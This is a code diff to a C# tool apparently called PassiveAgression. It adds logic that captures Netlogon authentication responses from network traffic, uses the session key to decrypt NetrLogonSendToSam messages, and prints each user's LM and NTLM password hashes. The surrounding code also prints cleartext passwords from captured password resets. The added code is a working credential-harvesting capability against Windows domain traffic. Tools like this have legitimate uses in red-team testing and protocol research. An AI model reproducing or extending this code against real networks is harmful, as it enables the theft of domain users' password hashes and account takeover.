@@ -24,7 +24,50 @@ namespace PassiveAgression.Core
 
         public ConcurrentBag<SamrSetInformationUser2> DecryptedSamrSetInformationUser2Events = new();
 
+        private ConcurrentBag<NetRServerAuthenticate3Response> NetRServerAuthenticate3Response = new();
+        private ConcurrentQueue<NetRLogonSendToSam> netrLogonSendToSam = new ConcurrentQueue<NetRLogonSendToSam>();
+        public ConcurrentBag<NetRLogonSendToSam> DecryptedLogonSendToSams = new();
+
+
         #region adding methods
+
+        /// <summary>
+        /// Adds new NetRServerAuthenticate3Response event to the list
+        /// </summary>
+        /// <param name="netrServerAuthenticate3Response"></param>
+        public void AddNetrServerAuthenticate3Response(NetRServerAuthenticate3Response netrServerAuthenticate3Response)
+        {
+            if (netrServerAuthenticate3Response == null)
+                return;
+
+            if (!netrServerAuthenticate3Response.success)
+                return;
+
+            if (NetRServerAuthenticate3Response.Contains(netrServerAuthenticate3Response))
+                return;
+
+            NetRServerAuthenticate3Response.Add(netrServerAuthenticate3Response);
+        }
+
+        /// <summary>
+        /// Adds NetRLogonSendToSam event to the queue
+        /// </summary>
+        /// <param name="sendtosam"></param>
+        public void AddSendToSam(NetRLogonSendToSam sendtosam)
+        {
+            if (sendtosam == null)
+                return;
+
+            if (!sendtosam.success)
+                return;
+
+            if (netrLogonSendToSam.Contains(sendtosam))
+                return;
+
+            netrLogonSendToSam.Enqueue(sendtosam);
+        }
+
+
 
         /// <summary>
         /// Adds new SMBSessionNegotiation event to the list
@@ -112,6 +155,22 @@ namespace PassiveAgression.Core
             Console.WriteLine($"\tNew password:\t{pwdreset.ClearTextPassword}");
         }
 
+        private void PrintSendToSam(NetRLogonSendToSam logonSendToSam)
+        {
+
+            if (string.IsNullOrEmpty(logonSendToSam.LMHash) &&
+                string.IsNullOrEmpty(logonSendToSam.NTLMHash))
+                return;
+
+            Console.WriteLine($"");
+            Console.WriteLine("[+] NetrLogonSendToSam data: ");
+            Console.WriteLine($"\tUser:\t{logonSendToSam.UserRef}");
+            Console.WriteLine($"\trID:\t{logonSendToSam.rID}");
+            Console.WriteLine($"\tLM:\t{logonSendToSam.LMHash}");
+            Console.WriteLine($"\tNTLM:\t{logonSendToSam.NTLMHash}");
+        }
+
+
         #endregion
 
         public async Task Start()
@@ -144,6 +203,10 @@ namespace PassiveAgression.Core
         {
             while (!setInformationUser2.IsEmpty)
                 ProcessSetInformationUser2();
+            
+                
+            while (!netrLogonSendToSam.IsEmpty) 
+                ProcessNetrLogonSendToSam();
         }
 
         /// <summary>
@@ -189,5 +252,43 @@ namespace PassiveAgression.Core
                 DecryptedSamrSetInformationUser2Events.Add(response);
             }
         }
+
+
+        /// <summary>
+        /// Contains logic to find session key to decrypt contents
+        /// and decode the data
+        /// </summary>
+        private void ProcessNetrLogonSendToSam()
+        {
+            // Fetch from queue
+            NetRLogonSendToSam response;
+            var successDequeue = netrLogonSendToSam.TryDequeue(out response);
+
+            if (!successDequeue)
+                return;
+
+            // Check if there's netrServerAuthenticate3 event available in the same stream
+            var authResponses = NetRServerAuthenticate3Response
+                          .Where(b => b.connectionInfo.StreamIndex == response.connectionInfo.StreamIndex &&
+                                      b.connectionInfo.SourceIP == response.connectionInfo.DestinationIP).ToList();
+
+            // There is not. Add back to the queue
+            if (!authResponses.Any())
+            {
+                netrLogonSendToSam.Enqueue(response);
+                return;
+            }
+
+            // There is. Select session key and decrypt data
+            var sessionKey = authResponses[0].sessionKey;
+            response.Decrypt(sessionKey);
+
+            if (response.success)
+            {
+                PrintSendToSam(response);
+                DecryptedLogonSendToSams.Add(response);
+            }
+        }
+
     }
 }
